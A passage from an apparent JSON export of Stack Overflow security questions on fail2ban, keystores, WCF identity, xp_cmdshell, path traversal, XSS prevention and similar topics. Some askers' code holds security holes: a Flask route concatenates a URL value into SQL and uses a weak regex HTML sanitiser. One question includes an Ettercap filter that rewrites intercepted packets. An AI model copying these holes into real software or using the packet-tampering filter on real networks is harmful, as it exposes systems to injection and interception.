(!identity.IsAuthenticated)\n     return db.TheoryTests.Include(t=&gt;t.TrafficImages).Where(t=&gt;t.PublicAvalible)\n            .Select(t =&gt; new { Id = t.Id, Title = t.Title, Images = t.TrafficImages }).AsEnumerable();\n\n   if (User.IsInRole(\"WebAdmins\"))\n       return db.TheoryTests.AsEnumerable();\n\n    var key = identity.GetProvider();\n\n    var member = db.Members.Include(m=&gt;m.PayedTheoryTests).SingleOrDefault(m=&gt;m.Identities.Any(\n        i=&gt;i.identityprovider == key.provider &amp;&amp;\n        i.nameidentifier == key.id));\n        if(member!=null)\n            return db.TheoryTests.Include(t =&gt; t.TrafficImages).Where(t =&gt; t.PublicAvalible).Select(t =&gt; new { Id = t.Id, Title = t.Title, Images = t.TrafficImages }).AsEnumerable();\n        else\n            return db.TheoryTests.Include(t =&gt; t.TrafficImages).Where(t =&gt; t.PublicAvalible)\n                .Union(member.PayedTheoryTests).Select(t =&gt; new { Id = t.Id, Title = t.Title, Images = t.TrafficImages }).AsEnumerable();\n\n\n\n}\n</code></pre>\n\n<p>When thinking about it, what i miss is something like a viewmodel untop of my database depending on the state of the user. Would it be a solution to create two entity frameworks ontop of the same database, one for limited data display and one for more advanced operations?</p>\n"},{"tags":["apache","security","ubuntu-12.04"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13141906,"title":"fail2ban-apache not blocking IP","body":"<p>I'm trying to configure fail2ban, I attempted to log into my web server numerous times to trigger the rule and looking at my iptable it seems to have worked:</p>\n\n<pre><code>Chain fail2ban-apache (1 references)\ntarget     prot opt source               destination\nDROP       all  --  192.168.1.70         0.0.0.0/0\nRETURN     all  --  0.0.0.0/0            0.0.0.0/0\n</code></pre>\n\n<p>But, if i try and access the apache server from .70 I still can!</p>\n\n<p>Any ideas?</p>\n"},{"tags":["java","security","keystore","digital-certificate"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12201672,"title":"java keystore file limitations","body":"<p>I created a keystore file for my PFX certificates (<a href=\"http://en.wikipedia.org/wiki/PKCS12\" rel=\"nofollow\">PKCS#12</a>), but I need to know how many keys can be stored in a keystore file (JKS).</p>\n\n<p>I'm currently loading the certificates as follows:</p>\n\n<pre><code>KeyStore oStore = KeyStore.getInstance(\"PKCS12\");\noStore.load(new FileInputStream(AppConfig.get(AppConfig.SRC_KEY)), \n    \"SECRET\".toCharArray());\n...\noStore.setKeyEntry(idAlias, privateKey, pwd.toCharArray(), chain);\noStore.store(new FileOutputStream(AppConfig.get(AppConfig.SRC_KEY)),  \n    \"SECRET\".toCharArray());\n</code></pre>\n\n<p>Is there a limit to the number of keys and certificates I can store in this keystore?</p>\n"},{"tags":["security","postgresql"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":13138350,"title":"Postgresql database objects security","body":"<p>I am developing an application which will use a postgreSQL database backend. I want to prevent the user from seeing some of the db objects - stored procs implementation in particular etc.</p>\n\n<p>The \"obvious\" (but perhaps wrong) way is to GRANT CRUD access to the database to a specific user who will have an encrypted uname/pwd?</p>\n\n<p>Is there another way of doing this?.</p>\n\n<p>Note: My target audience are largely non-programmers, so I don't need anything that is \"unbreakable\" (assuming such a thing existed).</p>\n"},{"tags":["android","security","su"],"answer_count":1,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":64,"score":5,"question_id":13138867,"title":"How does Android SuperUser app detect that an app requests root?","body":"<p>I'm writing an app that will use <code>su</code> to execute some commands in the linux kernel. I was wondering how SuperUser figures out that the application is asking for root privileges ? Also, are there any known ways (through obfuscation) in which this check can be bypassed ?</p>\n\n<p>In other words: \nHow does Android/(SuperUser) know that an app requires root privileges despite the fact that there are no permissions explicitly requested in the android manifest file.</p>\n\n<p>I'm asking this question from a security standpoint. I want to know the details of how this works in order to be sure that a malicious app cannot bypass SuperUser.</p>\n"},{"tags":["security","browser","filter","liferay","hack"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13139915,"title":"Displaying filters in Browser poses Security threat?","body":"<p>Am using <code>Liferay portal 6.0</code>. Am using <code>Header Filter (com.liferay.portal.servlet.filters.header.HeaderFilter)</code>. This <code>filter</code> am using in <code>web.xml</code> of my Portlets. End user is able to see this filter in Browser. Below attached image gives all details of this <code>filter</code> and URL pattern. Using this information can any Security threat be posed to my application? How can I hide these details in my Browser response?<img src=\"http://i.stack.imgur.com/9sXo8.jpg\" alt=\"enter image description here\"></p>\n"},{"tags":["wcf","security","iis7","active-directory","net.tcp"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":13134795,"title":"WCF service with net.tcp binding (hosted on IIS 7) doesn't work under domain user (for app pool)","body":"<p>I have a WCF service with the following configuration</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration&gt;\n&lt;system.web&gt;\n   &lt;compilation debug=\"true\" /&gt;\n&lt;/system.web&gt;\n\n&lt;system.serviceModel&gt;\n&lt;bindings&gt;\n  &lt;netTcpBinding&gt;\n    &lt;binding name=\"CommonWindowsBinding\" maxReceivedMessageSize=\"40000000\"&gt;\n      &lt;security mode=\"TransportWithMessageCredential\" &gt;\n        &lt;transport clientCredentialType=\"None\"/&gt;\n        &lt;message clientCredentialType=\"Windows\" /&gt;\n      &lt;/security&gt;\n    &lt;/binding&gt;\n  &lt;/netTcpBinding&gt;\n&lt;/bindings&gt;\n\n&lt;serviceHostingEnvironment multipleSiteBindingsEnabled=\"true\" /&gt;\n\n&lt;services&gt;\n  &lt;service behaviorConfiguration=\"CommonBehavior\" name=\"Megatec.MasterTourService.AdminService\"&gt;\n    &lt;endpoint address=\"Windows\" binding=\"netTcpBinding\" bindingConfiguration=\"CommonWindowsBinding\" name=\"Megatec.MasterTourService.Contracts.IAdminServiceWindows\" contract=\"Megatec.MasterTourService.Contracts.IAdminService\"&gt;\n      &lt;identity&gt;\n        &lt;dns value=\"WCFServer\" /&gt;\n      &lt;/identity&gt;\n    &lt;/endpoint&gt;\n&lt;/services&gt;\n\n&lt;behaviors&gt;\n  &lt;serviceBehaviors&gt;\n    &lt;behavior name=\"CommonBehavior\"&gt;\n      &lt;dataContractSerializer maxItemsInObjectGraph=\"10000000\" /&gt;\n      &lt;serviceMetadata httpGetEnabled=\"true\" policyVersion=\"Policy15\" /&gt;\n      &lt;serviceDebug includeExceptionDetailInFaults=\"true\" /&gt;\n      &lt;serviceAuthorization impersonateCallerForAllOperations=\"true\" /&gt;\n      &lt;serviceCredentials&gt;\n\n        &lt;clientCertificate&gt;\n          &lt;authentication certificateValidationMode=\"PeerTrust\" /&gt;\n        &lt;/clientCertificate&gt;\n\n        &lt;serviceCertificate findValue=\"WCFServer\" storeLocation=\"LocalMachine\" storeName=\"My\" x509FindType=\"FindBySubjectName\" /&gt;\n\n        &lt;userNameAuthentication userNamePasswordValidationMode=\"Custom\" customUserNamePasswordValidatorType=\"Megatec.MasterTourService.Security.CustomUserNameValidator, Megatec.MasterTourService.Security\" /&gt;\n        &lt;/serviceCredentials&gt;\n       &lt;/behavior&gt;\n     &lt;/serviceBehaviors&gt;\n    &lt;/behaviors&gt;\n  &lt;/system.serviceModel&gt;\n&lt;/configuration&gt;\n</code></pre>\n\n<p>Code</p>\n\n<pre><code>public class AdminService : BaseAuthService, IAdminService\n{\n    [OperationBehavior(Impersonation = ImpersonationOption.Required)]\n    public bool HasRole(string roleName)\n    {\n        //work with database\n    }\n}\n</code></pre>\n\n<p>I host this service on IIS 7, for application pool I set domain user (Master\\MyLogin). I need domain user for delegation (according to <a href=\"http://msdn.microsoft.com/en-us/library/ff650896.aspx\" rel=\"nofollow\">step 4</a>).</p>\n\n<p>It works fine, when I consume service from a local client (the same computer, under Master\\MyLogin or some other domain user). But when I tried to consume service from the other network computer, it failed. Everything works fine with ApplicationPoolIdentity.</p>\n\n<p>Master\\MyLogin is a administrator on the computer with service (but he isn't a domain admin).</p>\n\n<p>Maybe, there is rights, which should be granted to Master\\MyLogin?</p>\n\n<p><strong>Update</strong>. Client exception.</p>\n\n<p>At first, there was SecurityNegotiationException. Next, I've added section </p>\n\n<pre><code>&lt;identity&gt;\n    &lt;userPrincipalName value=\"myLogin@Mydomain\" /&gt;\n&lt;/identity&gt;\n</code></pre>\n\n<p>New exception was MessageSecurityException. </p>\n\n<p><code>The identity check failed for the outgoing message. The expected identity is \"identity(http://schemas.xmlsoap.org/ws/2005/05/identity/right/possessproperty: http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn)\" for the 'net.tcp://dev4-10:5012/IISTest/AdminService.svc/Windows' target endpoint.</code></p>\n\n<p>How should I configure <code>&lt;identity&gt;</code> for client and service?</p>\n"},{"tags":["security","encryption","ssl-certificate","aes","certificate-authority"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13136675,"title":"Why do many SSL Certificate vendors advertise a 128/256Bit encryption support?","body":"<p>I was wondering why vendors of SSL-Certificates always say, that their certificate supports 128/256-Bit AES-Encryption?<br>\nI mean, the symmetric encryption is something that happens between a webbrowser and a webserver - and has nothing to do with the SSL-Certificate itself (as also no information about symmetric encryption is saved in the certificate...).</p>\n\n<p>Can anyone explain to me, why these companies advertise with this statement?<br>\nIs it just good marketing? Or is there a real functional reason behind?</p>\n\n<p>Examples see here:<br>\n<a href=\"http://www.startssl.com/?app=39\" rel=\"nofollow\">http://www.startssl.com/?app=39</a><br>\n<a href=\"https://www.symantec.com/theme.jsp?themeid=verisign-ssl-certificates&amp;inid=vrsn_symc_ssl_Buy\" rel=\"nofollow\">https://www.symantec.com/theme.jsp?themeid=verisign-ssl-certificates&amp;inid=vrsn_symc_ssl_Buy</a></p>\n"},{"tags":["database","json","security","configuration"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13138086,"title":"JSON vs DATABASE","body":"<p>Recently I had to make an application that later on had to be uploaded to multiple web-servers. Doing this I realized that when storing the admin pass and username's into a json file does not need a db connection so it works all the time. Also when saving the configuration inside json I can just copy my application to web-server and then just go to the browser to do the configuration. </p>\n\n<p>When using a database for this I have to configure this hard coded. Than the db connection would be declared inside a connect.php or config.php. When uploading the application I can't use it because there is no db connection. And I cant set A db connection from within the application itself because I can't login even if I could it would be like a car-key inside a closed car. </p>\n\n<p>My dilemma: Is this the right way, is this save, is this efficient and above all how did you guys do this.</p>\n\n<p>What is the best way to store admin login and configuiration data</p>\n"},{"tags":["android","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":52,"score":-6,"question_id":13138799,"title":"Android security concerns in java","body":"<p>I want to do my final year project as securing the android platform so i want some tips for security. How the security can be extended for this platform? For example, android has its core libraries open so they can be exploited and also data sent to browser is also not encrypted, so what can be various solutions to them?</p>\n"},{"tags":["java","security"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":71,"score":5,"question_id":13137456,"title":"Permission for reading System.in in java","body":"<p>I have some code which is reading user input from console using below code.</p>\n\n<pre><code>Console console = System.console();\nString input = console.readLine();\n</code></pre>\n\n<p>However, this code should run in a very secure env, where every action's permissions are controlled through a policy file.</p>\n\n<p>So I did my testing of the java code with policy file as </p>\n\n<pre><code>grant codeBase \"file:/myjar.jar\" {\n   permission java.security.AllPermission;\n};\n</code></pre>\n\n<p>I have no clue, what permission I should use to grant permission to <code>console.readLine()</code>.</p>\n"},{"tags":["security","sap"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13137589,"title":"SAP USMM mysap contractual user types not available","body":"<p>We have recently uploaded to ECC 6.0 and we have to do the user classification but now there's no mySAP professional cat II or any of them mySAP contractual user types on the list.</p>\n\n<p>Can someone help?</p>\n\n<p>Regards,</p>\n"},{"tags":[".net","security","sanitization"],"answer_count":6,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":2660,"score":5,"question_id":939159,"title":".NET libraries to sanitize input?","body":"<p>Are there any thoroughly tested .NET libraries out there to sanitize input from things like script/sql injection?</p>\n"},{"tags":["security","internet-explorer","url","protocols","updates"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13136215,"title":"Internet Explorer - Registering an Application to a URL Protocol after Security Update","body":"<p>As noted in <a href=\"http://msdn.microsoft.com/en-us/library/aa767914%28v=vs.85%29.aspx\" rel=\"nofollow\">Registering an Application to a URL Protocol</a>:</p>\n\n<p><em><strong>registered URL protocol vs. Security Update</em></strong></p>\n\n<p>It seems, that the Kumulatives Sicherheitsupdate fr Internet Explorer (2744842) <a href=\"http://technet.microsoft.com/de-de/security/bulletin/ms12-052\" rel=\"nofollow\">http://technet.microsoft.com/de-de/security/bulletin/ms12-052</a> supresses the using of the registered URL protocol.</p>\n\n<p>Before Internet Explorer, Mozilla Firefox and Chrome handled such urls in the right way: calling the registered application.</p>\n\n<p>Now Internet Explorer refuses the url, while Mozilla Firefox and Chrome are working properly!</p>\n\n<p><em>Does anyone knows how to handle it, please?</em></p>\n"},{"tags":["sql-server","security","bcp","xp-cmdshell","sql-server-administration"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13127013,"title":"What is the most secure way to allow users to execute BCP export command from SQL?","body":"<p>I am currently working in an environment where the ability to <strong>export</strong> a table <strong>programatically</strong> from within a hand-run SQL script would be of great help.  </p>\n\n<p>Performing the exports from script will be the first step towards running the entire process from within a stored procedure, therefore I have to be able to initiate the export from SQL.</p>\n\n<p>The organisation currently has the following configuration on most servers - </p>\n\n<ul>\n<li>SQL Server 2005 or 2008</li>\n<li>xp_cmdshell - <strong>disabled</strong></li>\n<li>CLR - <strong>enabled</strong></li>\n</ul>\n\n<p>Ultimately, I would like to be able to call a procedure passing the following parameters and have it perform the export.</p>\n\n<ul>\n<li>table name</li>\n<li>file path/name (on a network share)</li>\n<li>file format </li>\n</ul>\n\n<p>Currently BCP seems like a perfect option in terms of functionality but I am unable to invoke it via the command line due to xp_cmdshell being disabled.</p>\n\n<p>The organisation is quite small and happy work towards a secure solution and my impression so far is that they have a good level of control over their security.  They have made a blanket decision to disable xp_cmdshell but if I could present a safe way to allow use of it I think they would be pretty receptive. </p>\n\n<p>In my research I've come across both the <strong>'EXECUTE AS'</strong> functionality as well as signing procedures with <strong>certificates</strong>, but still cant work out if either approach can help me achieve what I want.</p>\n\n<p>Also, if you have another solution that allows me to achieve the same end-result I'm all ears!</p>\n"},{"tags":["security","symfony2","symfony-2.1"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12284214,"title":"symfony2 - multiple encoding password methods with mutiple user providers","body":"<p>I want to chain two user providers (FosUserBundle and a custom DB user provider over propel) with two distinct encoding password methods</p>\n\n<p>app/config/security.yml</p>\n\n<pre>\nsecurity:  \n\n    encoders:\n        FOS\\UserBundle\\Model\\UserInterface: sha512\n        My\\AuthBundle\\Model\\User: sha1\n\n    providers:\n        my_chain_providers:\n            chain:\n                providers: [\"fos_userbundle\", \"db_user\"]\n        fos_userbundle:\n            id: fos_user.user_provider.username_email\n        db_user:\n            propel:\n                class: My\\AuthBundle\\Model\\User\n                property: username\n\n    firewalls:\n        main:\n            pattern: ^/\n            form_login:\n                provider: my_chain_providers\n            logout:       true\n            anonymous:    true\n\n</pre>\n\n<p>my problem: password's hashs follow $password.'{'.$salt.'}' in fos_user table and $salt.$password in my custom DB user provider</p>\n\n<p>this gist <a href=\"https://gist.github.com/1243080\" rel=\"nofollow\">https://gist.github.com/1243080</a> show how to custom mergePasswordAndSalt method, but is it possible to have one mergePasswordAndSalt method per user provider?</p>\n"},{"tags":["android","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":74,"score":-2,"question_id":13120125,"title":"How to prevent hacker access my app's database on android?","body":"<p>as you know, we can access to any folder on android device after rooting. My app has a database and some other binary files. I know that I can't prevent user see my files and database. But is there any way to prevent user copy it to other android devices for illegal use?</p>\n"},{"tags":["security","testing"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":363,"score":0,"question_id":5105726,"title":"Any ideas why Ettercap filters aren't seeing packet data?","body":"<p>I'm using an Ettercap filter to detect a query response coming back from a particular service on a remote machine. When I see a response from the service, I'm searching through the data in the packet to see if an offset is a specific value, and if so I'm changing the value at another offset.</p>\n\n<p>Trouble is, when I try this on a new virtual machine I built my Ettercap filter's no longer getting any data in the DATA.data variable available to it.</p>\n\n<pre><code>if(ip.proto == TCP &amp;&amp; tcp.src == 17867) {\n  msg(\"Response seen!\\n\");\n\n  if(DATA.data + 2 == \"\\0x01\") {\n    msg(\"Flag detected!\\n\");\n\n    DATA.data + 5 = 0x09;\n  }\n}\n</code></pre>\n\n<p>The filter's getting applied to the traffic because \"Response seen!\" messages get printed out by Ettercap. However, \"Flag detected!\" messages do not. I <strong>think</strong> DATA.data is indeed empty because if I change my second \"if\" statement to check for <code>DATA.data == \"\"</code> then the \"Flag detected!\" message gets printed.</p>\n\n<p>Any ideas why this may be happening?!</p>\n\n<p>Also, if this is the wrong site to be asking questions like this, please let me know. I wasn't sure if it fit better here or somewhere like superuser or serverfault.</p>\n"},{"tags":["security","session","authentication","oauth","go"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":13131587,"title":"Token based session management","body":"<p>I use a GO server (golang.org), which does have good support for encryption and third party package which provides basic cookie based session handling.  I am looking for guidelines on generating tokens, and good practice to store, invalidate etc. My application need custom user management. Can one use Oauth in an offline setting, or any better way?</p>\n"},{"tags":["java","security","random","statistics"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":133,"score":5,"question_id":13123593,"title":"Random identifier in java","body":"<p>I would like to generate random identifier in java. The identifier should have a fixed size, and the probability of generating the same identifier twice should be very low(The system has about 500 000  users).In addition; the identifier should be so long that its unfeasible to guess it by a brute force attack. </p>\n\n<p>My approach so far is something along the lines of this: </p>\n\n<pre><code>String alphabet = \"0123456789ABCDE....and so on\";\nint lengthOfAlphabet = 42; \nlong length = 12; \n\npublic String generateIdentifier(){\n    String identifier = \"\";\n    Random random = new Random(); \n    for(int i = 0;i&lt;length;i++){\n        identifier+= alphabet.charAt(random.nextInt(lengthOfAlphabet));\n    }\n    return identifier; \n}\n</code></pre>\n\n<p>Im enforcing the uniqueness by a constraint in the database. If I hit an identifier that already has been created, Ill keep generating until I find one thats not in use.  </p>\n\n<p>My assumption is that I can tweak lenghtOfAlpahbet and length to get the properties Im looking for:</p>\n\n<ol>\n<li>Rare collisions</li>\n<li>Unfeasible to brute force </li>\n<li>The identifier should be as short as possible, as the users of the system will have to type it. </li>\n</ol>\n\n<p>Is this a good approach? Does anyone have any thoughts on the value of length?  </p>\n"},{"tags":["java","security","jsp","servlets","xss"],"answer_count":8,"favorite_count":8,"up_vote_count":9,"down_vote_count":0,"view_count":6902,"score":9,"question_id":2658922,"title":"XSS prevention in Java","body":"<p>How can I prevent XSS attacks in Java? Are there any good libraries for that?</p>\n"},{"tags":["security","http","sanitization"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13130282,"title":"Is checking for double dots enough to prevent paths from escaping jail?","body":"<p>I'm writing a service that sends over the network the contents of requested files.  However, I'll only answer requests for files that descend from a fixed <code>parent</code> directory.</p>\n\n<p>The first potential security problem that comes to mind is that an evil user may request paths with <code>..</code> embedded.  Another potential problem are symlinks, though these should not be an issue since I control the local filesystem and there won't be any simlinks under <code>parent</code>.</p>\n\n<p>My question is therefore whether it is enough to check for the existence of <code>..</code> among the path components.  Or is there some other security vulnerability I have forgotten?</p>\n"},{"tags":["ruby-on-rails","ruby","security","https"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":12984148,"title":"Trying to force ssl, getting \"This webpage has a redirect loop\"","body":"<p>I'm trying to force all urls generated by my controller to be \"https\" and redirecting to https otherwise. I tried the method explained in <a href=\"http://lucastej.blogspot.com/2008/01/ruby-on-rails-how-to-set-urlfor.html\" rel=\"nofollow\">this blog</a> and the one suggested by Olly <a href=\"http://stackoverflow.com/questions/1662262/rails-redirect-with-https\">here</a>\nand I'm getting this error if I try to access my application:</p>\n\n<blockquote>\n  <p><strong>This webpage has a redirect loop</strong></p>\n  \n  <p>The webpage at https://'example.com' has resulted in too many redirects. Clearing\n  your cookies for this site or allowing third-party cookies may fix the problem.\n  If not, it is possibly a server configuration issue and not a problem with\n  your computer.</p>\n</blockquote>\n\n<p>Clearing the cookie doesn't help. Why is it going into a loop? I made sure to run the code under condition that request.ssl is false. I'm using Rails 2.3.10. \nSo here is what I tried, in my application controller I added:</p>\n\n<pre><code>     url_for unless (Rails.env.test? || Rails.env.development?) \n     def default_url_options(options) \n    { :only_path =&gt; false, :protocol =&gt; 'https' } unless (Rails.env.test? ||  Rails.env.development?) \n    end\n</code></pre>\n\n<p>I also tried</p>\n\n<pre><code>def redirect_to_https\n  redirect_to :protocol =&gt; \"https://\" unless (request.ssl? || Rails.env.test? || Rails.env.development? || local_request?)\nend\n</code></pre>\n"},{"tags":["php","android","security","application","oauth"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":62,"score":2,"question_id":13099343,"title":"How to secure connection between PHP and Android","body":"<p>I have an android application that requires a connection with PHP pages in order to add sensitive data to a database that will affect the application. one can simply find the url where the data is sent to and manipulate it.</p>\n\n<p>I thought about creating a registration based on IMEI, but still able to manipulate it for malicious purposes.</p>\n\n<p>I have also checked OAuth, I didn't really understand how it works and if it can help in my condition.\nWhat can I do to fully secure my application?\nThanks in advance!</p>\n\n<p>EDIT:\nBy the way, what I am mostly trying to achieve here is to make sure the requests are being sent from an Android and not from any other device.</p>\n"},{"tags":["python","security","xss","flask","sanitize"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13127547,"title":"Critique my Flask HTML-Sanitizer for XSS security","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/699468/python-html-sanitizer-scrubber-filter\">Python HTML sanitizer / scrubber / filter</a>  </p>\n</blockquote>\n\n\n\n<p>I am creating my first website, and am trying to be security conscious while doing it. My main strategy right now is relying on simplicity as safety. Like, I'm fine with simpler feautures if it means simpler security and less security holes. I'm making the website with Flask and Python. In one section, I allow user generated content to be displayed on the page as { content | safe }. I understand that this can make me vulnerable to a XSS attack, and have looked at a few different ways of sanitizing HTML code before it is stored as content, but there always seems to be a condition in which it is unsecure. I wrote my own code for sanitizing that is very limiting for the user (it only allows a few essential tags), but feels secure to me, and I'm wondering if there's a reason that this doesn't work for other people.</p>\n\n<p>Without further ado, these are the relevant parts of my code, please critique it if you see holes:</p>\n\n<pre><code>flask_file.py\n\nimport re\n\nACCEPTED_HTML= [\"&lt;b&gt;\",\"&lt;/b&gt;\",\"&lt;i&gt;\",\"&lt;/i&gt;\",\"&lt;br&gt;\",\"&lt;br /&gt;\",\"&lt;u&gt;\",\"&lt;/u&gt;\"]\n\napp = Flask(__name__)\napp.config.from_object(__name__)\n\ndef sanitize(text):\n   tag_pattern = re.compile(\"&lt;.*?&gt;\")\n   for tag in re.findall(tag_pattern,text):\n       if tag.lower() not in app.config['ACCEPTED_HTML']:\n          text = re.sub(tag,\"\",text)\n       continue\n    return text\n\n@app.route('/u/&lt;user&gt;/profile', methods=['GET','POST'])\ndef edit_profile(user):\n   cur = g.db.execute('select username, message, greetingmessage, password from users where username=\"'+user+'\"')\n   curr_user = [dict(username=row[0], messages=row[1], greet=row[2], pword=row[3]) for row in cur.fetchall()][0]\n   if request.method == 'POST':\n      g_message = sanitize(request.form['greet_message'])\n      g.db.execute('delete from users where username =\"'+curr_user['username']+'\"')\n      g.db.execute('insert into users (username, message, greetingmessage, password) values (?, ?, ?, ?)',\n        [curr_user['username'],curr_user['messages'], g_message,curr_user['pword']])\n      g.db.commit()\n      return redirect(url_for('user_page', user=user))\n   return render_template('edit_profile.html', user=curr_user['username'], greeting_message=curr_user['greet'])\n</code></pre>\n\n<p>Would I be better off just using a built it sanitization module? Did I totally misunderstand XSS?</p>\n"},{"tags":["wcf","security","rest","asp.net-web-api","servicestack"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":26,"score":-1,"question_id":13127414,"title":"file streaming sensitive data","body":"<p>I am looking for options to build a service to upload files(sensitive data) from the client over the internet. \nI googled on this topic and looks like I found these are the options.</p>\n\n<ol>\n<li>WCF REST with message based security and https</li>\n<li>ASP.net Web-API</li>\n<li>ServiceStack\nCould you please let me know if I am on right track? Any suggestions or links would be appreciated.</li>\n</ol>\n\n<p>Thank you.</p>\n"},{"tags":["security","web-security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13122239,"title":"Providing a public link to an admin area - bad idea?","body":"<p>I have a client who is requesting that we add a link to the system admin area on the main (public) website so that they can just go to the site and click the URL.</p>\n\n<p>Would you consider this to be a bad idea? I find it a bit odd that they cant remember to go to /admin - seems pretty much like you're inviting someone to try and break in, does it not?</p>\n\n<p>I've been trying to come up with some other method. If it was me, I'd just bookmark it, however my client is a consortium of...'old gentlemen' with little computing know-how.</p>\n\n<p>Any thoughts on how this should be tackled?</p>\n"},{"tags":["php","security"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":979,"score":5,"question_id":8115159,"title":"Can people write a .php file to my chmod 777 folder","body":"<p>Is it possible for hackers ( or other ) to upload/write a php file to a folder on my site that has chmod 777?</p>\n\n<p>Example:</p>\n\n<p>I have a folder that has chmod 777.\nThat folder contains images.\nI use .htaccess to block indexing the folder.</p>\n\n<p>Reformed question:\nCan people write a .php file to my folder that has chmod 777 by using a PHP script on their website? For example , to list all the images in that folder</p>\n\n<p>( I'm familiar with the right chmod for uploading folder etc .. , just asking it hypotheticaly )</p>\n"},{"tags":["java","security","batch","applet","keytool"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":346,"score":1,"question_id":7571949,"title":"Answer password to keytool in batch files","body":"<p>i need use keytool and jarsigner to sign a lot o files here in many folders.<br>\nEach time i start sign theses files i need delete the .cert and keystore file to recreate it.<br>\nIm on development enviroment and using fake passwd to sign it, after application working the infra people will take care of sign it, i havent access to real certificates.<br>\nWhen i was typing and the [keytool -import .......] ,after enter, ask for password i simply type it<br>\nbut in batch it become a problem.<br>\nIm on windows 7 here.<br>\nI was tried [keytool -import ....... &lt; passHere] and<br>\n[keytool -import ....... | passHere] too but its dont work.<br>\nI want turn sign most automatic possible.<br>\nThere is someone telling about use it programatically <a href=\"http://stackoverflow.com/questions/5051195/how-to-utilize-keytool-programatically\">here</a> but i simply need it on a bat file.<br>\nThe password is a <strong>fixed</strong> value <strong>inside</strong> batch file.<br>\nThere is a way to give passwd inline to keytool?<br>\nIs possible set an enviroment variable in 'run time' to feed keytool password? how do it ?<br>\nThere is a way to give passwd inside bath to keytool? I see <a href=\"http://support.microsoft.com/default.aspx?scid=KB;EN-US;Q77457&amp;\" rel=\"nofollow\">this</a> but dont help because im not a asm developer and not sure if it match problem and im wondering if there is something more simple.</p>\n\n<p>Thanks</p>\n"},{"tags":["json","security","rest"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":262,"score":1,"question_id":6103306,"title":"Is this a valid JSON response?","body":"<p>G'day gurus,</p>\n\n<p>I'm calling the REST APIs of an enterprise application that shall remain nameless, and they return JSON such as the following:</p>\n\n<pre><code>throw 'allowIllegalResourceCall is false.';\n{\n  \"data\": ... loads of valid JSON stuff here ...\n}\n</code></pre>\n\n<p>Is this actually valid JSON?  If (as I suspect) it isn't, is there any <em>compelling</em> reason for these kinds of shenanigans?</p>\n\n<p>The response I received from the application vendor is that this is done for security purposes, but I'm struggling to understand how this improves security much, if at all.</p>\n\n<p>Thanks in advance!</p>\n\n<p>Peter</p>\n"},{"tags":["c#","wcf","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":107,"score":1,"question_id":3954017,"title":"Verifying remote program integrity/validity as part of WCF service security","body":"<p>I have an application running on remote systems. The remote systems are an embedded computer built into a kiosk. As a result, they are somewhat \"untrusted,\" in that the physical security for them is rather lax. However, these kiosks can be credit card processing, etc. via a WCF service to my server.</p>\n\n<p>Using machine certificates, etc., I can verify that the client is who they say they are, which protects against someone copying my binaries off of the kiosk somehow and then running it on their own machine. However, how can I prevent against the following two attacks:</p>\n\n<ul>\n<li>Someone takes the binary, modifies it maliciously, and then runs it on the system</li>\n<li>Someone decompiles my application, and using parts of my code (such as where I reference certificates or shared secrets) writes their own application, and runs it on the machine.</li>\n</ul>\n\n<p>Obviously I have taken steps using the operating system to prevent against these sort of attacks, but I need a way at the server to ensure that it is not being duped.</p>\n\n<p>Any suggestions?</p>\n"},{"tags":["wcf","security","firewall","dmz"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":15,"score":-1,"question_id":13123035,"title":"Security concerns for putting a WCF based server outside firewall","body":"<p>We've built a small service that passes messages for client machines. The service was developed with WCF and we use <em>Windows Security</em> to leverage active directory trust to manage identities. Basically the server will reject a client if it's from a domain that is not trusted by where the domain where the server is located. </p>\n\n<p>There's a new requirement: it's important that the server can handle client requests from 